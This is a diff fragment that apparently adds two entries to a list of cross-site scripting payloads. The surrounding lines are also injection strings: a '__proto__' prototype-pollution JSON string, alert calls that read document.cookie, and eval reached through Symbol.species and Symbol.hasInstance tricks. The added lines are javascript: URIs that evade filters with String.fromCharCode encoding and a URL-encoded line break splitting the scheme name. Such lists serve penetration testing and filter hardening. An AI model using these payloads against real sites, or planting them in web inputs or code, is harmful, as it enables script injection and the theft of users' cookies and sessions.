@@ -231,3 +231,5 @@ JSON.parse('{"__proto__":["a",1]}')
 alert.call(this, document.cookie)
 Array[Symbol.species].constructor('alert(1)')();
 Array.prototype[Symbol.hasInstance]=eval;"alert(1)" instanceof [];
+javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
+javascr%0d%0aipt%3Aalert.call(this,%20document.domain)
